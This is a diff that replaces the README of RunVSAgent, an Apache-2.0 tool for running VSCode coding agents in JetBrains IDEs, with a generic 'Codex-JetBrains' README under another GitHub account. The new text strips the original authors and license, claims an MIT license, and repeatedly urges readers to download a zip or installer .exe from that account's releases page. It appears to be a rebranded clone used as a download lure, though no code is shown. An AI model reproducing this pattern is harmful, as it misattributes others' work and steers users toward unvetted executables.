@@ -1,230 +1,73 @@
-# RunVSAgent
+# 🎉 Codex-JetBrains - Effortlessly Use VSCode Tools in Your IDE
 
-English | [简体中文](README_zh.md)
+[![Download Codex-JetBrains](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Meng-dev001/Codex-JetBrains/releases)
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org/)
-[![JetBrains](https://img.shields.io/badge/JetBrains-IntelliJ%20Platform-orange.svg)](https://www.jetbrains.com/)
+## 📦 Overview
+Codex-JetBrains allows you to run VSCode-based coding agents and extensions within your favorite IDE. This application bridges the gap between the VSCode ecosystem and other development environments. With Codex-JetBrains, you can enhance your coding experience without switching between tools.
 
-> **Run VSCode-based Coding Agents in Other IDE platforms**
+## 🚀 Getting Started
+Follow these simple steps to download and run Codex-JetBrains.
 
-RunVSAgent is an innovative cross-platform development tool that enables developers to run VSCode-based coding agents and extensions within JetBrains IDEs (IntelliJ IDEA, WebStorm, PyCharm, etc.) or other IDE platforms. 
+1. **Ensure Your System Meets Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - RAM: At least 4 GB
+   - Disk Space: 100 MB free space
+   - Java Version: JDK 11 or later installed
 
-## 📸 Screenshot
+2. **Visit the Releases Page**
+   To download the latest version of Codex-JetBrains, [visit the Releases page](https://github.com/Meng-dev001/Codex-JetBrains/releases).
 
-![RunVSAgent Screenshot](docs/screenshot.jpg)
+3. **Download the Latest Version**
+   On the Releases page, find the latest version. Click on the link to download the application file. This file is often named something like `Codex-JetBrains-v1.0.zip` or `Codex-JetBrains-installer.exe`.
 
-## 🚀 Core Features
+4. **Extract and Install**
+   If you downloaded a ZIP file, right-click the ZIP file and select "Extract All." Choose a destination folder and click "Extract." For an installer, simply double-click the file and follow the on-screen instructions to complete the installation.
 
-- **VSCode Agent Compatibility**: Seamlessly run VSCode-based coding agents in JetBrains IDEs
-- **Cross-IDE Development**: Unified agent experience across different IDE platforms
+5. **Launch the Application**
+   After installation, find Codex-JetBrains in your applications folder or start menu. Double-click the icon to launch the program.
 
-## 🤖 Supported Agents
+## 🔧 Features
+- **Seamless Integration**: Use VSCode extensions directly in your IDE.
+- **Customizable Environment**: Tailor the settings to fit your workflow.
+- **Efficient Coding Tools**: Access powerful coding assistants easily.
+- **User-Friendly Interface**: Designed for non-technical users to navigate effortlessly.
 
-- **[Roo Code](https://roocode.com)**: Advanced AI-powered coding assistant with intelligent code generation and refactoring capabilities
-- **[Cline](https://cline.bot)**: Autonomous coding agent right in your IDE, capable of creating/editing files, executing commands, using the browser, and more with your permission every step of the way.
-- **[Kilo Code](https://kilocode.ai)**: Open-source VS Code AI agent
+## 📥 Download & Install
+To get started, [visit this page to download](https://github.com/Meng-dev001/Codex-JetBrains/releases). Locate the latest version, download it, and follow the instructions provided.
 
-## 🔧 Supported IDEs
+## 📚 User Guide
+Here’s how to make the most out of Codex-JetBrains:
 
-### Jetbrains IDEs
-RunVSAgent currently supports the following JetBrains IDE series:
+- **Step 1: Setup Coding Agents**  
+  Once you open Codex-JetBrains, you'll see options to add coding agents. Choose the agents suitable for your projects and initialize them.
 
-- **IntelliJ IDEA** (Ultimate & Community)
-- **WebStorm** - JavaScript and TypeScript development
-- **PyCharm** (Professional & Community) - Python development
-- **PhpStorm** - PHP development
-- **RubyMine** - Ruby development
-- **CLion** - C/C++ development
-- **GoLand** - Go development
-- **DataGrip** - Database development
-- **Rider** - .NET development
-- **Android Studio** - Android development
+- **Step 2: Install Extensions**  
+  Navigate to the extensions tab. Browse or search for the VSCode extensions you need. Click “Install” for each extension you want to use.
 
-> **Note**: Requires JetBrains IDE version 2023.1 or later for optimal compatibility.
+- **Step 3: Start Coding**  
+  Use the built-in features to enhance your coding experience. The interface is straightforward, making it easy to focus on your projects.
 
+## 🛠️ Troubleshooting
+Here are common issues and their solutions:
 
-## 🏗️ Architecture
+- **Cannot Find the Application After Installation**  
+  Recheck your applications folder or search "Codex-JetBrains" in your start menu.
 
-```mermaid
-graph TB
-    subgraph "JetBrains IDE"
-        A[JetBrains Plugin<br/>Kotlin]
-        B[UI Integration]
-        C[Editor Bridge]
-    end
-    
-    subgraph "Extension Host"
-        D[Node.js Runtime]
-        E[VSCode API Layer]
-        F[Agent Manager]
-    end
-    
-    subgraph "VSCode Agents"
-        G[Coding Agent]
-    end
-    
-    A <-->|RPC Communication| D
-    B --> A
-    C --> A
-    
-    E --> D
-    F --> D
-    
-    G --> E
-```
+- **Extensions Not Working Properly**  
+  Ensure you have the latest version of the extensions. If problems persist, try reinstalling the extension.
 
-**Architecture Components**:
-- **JetBrains Plugin**: Kotlin-based IDE plugin for JetBrains IDE integration
-- **Extension Host**: Node.js runtime environment providing VSCode API compatibility layer
-- **RPC Communication**: High-performance inter-process communication for real-time data exchange
-- **VSCode Agents**: Various coding agents and extensions developed for the VSCode platform
+- **Installation Fails**  
+  Ensure you have enough disk space and that your operating system is up-to-date.
 
-## 📦 Installation
+## 👥 Community Support
+Join the Codex-JetBrains community for tips, tricks, and support. Share your experiences and learn from others using Codex-JetBrains in their projects.
 
-### [Download from JetBrains Marketplace](https://plugins.jetbrains.com/plugin/28068-runvsagent) (Recommended)
+## 💬 Feedback
+Your feedback is valuable. Let us know your thoughts and suggestions for improving Codex-JetBrains. Reach out by opening an issue on our GitHub page.
 
-**Recommended Method**: We recommend downloading and installing the plugin from JetBrains Marketplace first, as this is the most convenient and secure installation method.
+## 📄 License
+Codex-JetBrains is released under the MIT License. Feel free to modify and distribute the software, provided you follow the same license terms.
 
-1. **Online Installation**:
-   - Open your JetBrains IDE (IntelliJ IDEA, WebStorm, PyCharm, etc.)
-   - Go to `Settings/Preferences` → `Plugins`
-   - Search for "RunVSAgent" in the `Marketplace` tab
-   - Click the `Install` button
-   - Restart your IDE when prompted
+[![Download Codex-JetBrains](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Meng-dev001/Codex-JetBrains/releases) 
 
-2. **Verify Installation**: After restart, you should see the RunVSAgent plugin in your IDE's plugin list
-
-### Download from GitHub Releases
-
-You can download the pre-built plugin from our GitHub releases page:
-
-1. **Download Plugin**: Visit the [GitHub Releases](https://github.com/wecode-ai/RunVSAgent/releases) page and download the latest plugin file (`.zip` format)
-
-2. **Install in JetBrains IDE**:
-   - Open your JetBrains IDE (IntelliJ IDEA, WebStorm, PyCharm, etc.)
-   - Go to `Settings/Preferences` → `Plugins`
-   - Click the gear icon ⚙️ and select `Install Plugin from Disk...`
-   - Select the downloaded `.zip` file
-   - Restart your IDE when prompted
-
-3. **Verify Installation**: After restart, you should see the RunVSAgent plugin in your IDE's plugin list
-
-
-### Build from Source
-
-#### Prerequisites
-- Node.js 18.0+
-- JetBrains IDE 2023.1+
-- Git
-- JDK 17+
-
-#### Build Steps
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/your-org/RunVSAgent.git
-cd RunVSAgent
-
-# 2. Setup development environment
-./scripts/setup.sh
-
-# 3. Build the project
-./scripts/build.sh
-
-# 4. Install plugin
-# Plugin file located at: jetbrains_plugin/build/distributions/
-# In IDE: Settings → Plugins → Install Plugin from Disk
-```
-
-#### Development Mode
-
-```bash
-# Start extension host in development mode
-cd extension_host
-npm install
-npm run dev
-
-# Run JetBrains plugin in development mode
-cd jetbrains_plugin
-./gradlew runIde
-```
-
-## 👥 Developer Information
-
-### Project Structure
-
-```
-RunVSAgent/
-├── extension_host/          # Node.js Extension Host
-│   ├── src/                # TypeScript source code
-│   │   ├── main.ts         # Main entry point
-│   │   ├── extensionManager.ts  # Extension lifecycle management
-│   │   ├── rpcManager.ts   # RPC communication layer
-│   │   └── webViewManager.ts    # WebView support
-│   └── package.json        # Node.js dependencies
-├── jetbrains_plugin/       # JetBrains Plugin
-│   ├── src/main/kotlin/    # Kotlin source code
-│   │   └── com/sina/weibo/agent/
-│   │       ├── core/       # Core plugin functionality
-│   │       ├── actions/    # IDE actions and commands
-│   │       ├── editor/     # Editor integration
-│   │       └── webview/    # WebView support
-│   └── build.gradle.kts    # Gradle build configuration
-└── scripts/                # Build and utility scripts
-```
-
-### Technology Stack
-
-- **Extension Host**: Node.js 18+, TypeScript 5.0+
-- **JetBrains Plugin**: Kotlin 1.8+, IntelliJ Platform 2023.1+
-- **Communication**: RPC over Unix Domain Sockets/Named Pipes
-- **Build Tools**: npm/pnpm, Gradle, Shell scripts
-
-### Known Issues
-
-For a list of known issues and common problems, please see [Known Issues](docs/KNOWN_ISSUES.md).
-
-### Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/your-feature`
-3. Make your changes and add tests
-4. Run tests: `./scripts/test.sh`
-5. Submit a pull request
-
-## 👥 Contributors
-
-We thank all the contributors who have helped make this project better:
-
-### 🌟 Core Contributors
-- **[Naituw](https://github.com/Naituw)** - *Project Architect*
-- [wayu002](https://github.com/wayu002)
-- [joker535](https://github.com/joker535)
-- [andrewzq777](https://github.com/andrewzq777)
-- [debugmm](https://github.com/debugmm)
-- [Micro66](https://github.com/Micro66)
-- [qdaxb](https://github.com/qdaxb)
-
-### 🚀 Contributors
-
-- [junbaor](https://github.com/junbaor)
-- [aheizi](https://github.com/aheizi)
-- [Adam Hill](https://github.com/adamhill)
-
-### License
-
-This project is licensed under the Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-### Maintainers
-
-- **Organization**: WeCode-AI Team, Weibo Inc.
-- **Contact**: [GitHub Issues](https://github.com/wecode-ai/RunVSAgent/issues)
-- **Website**: [https://weibo.com](https://weibo.com)
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=wecode-ai/RunVSAgent&type=Date)](https://www.star-history.com/#wecode-ai/RunVSAgent&Date)
-**Made with ❤️ by WeCode-AI Team**
+Thank you for choosing Codex-JetBrains! Happy coding!
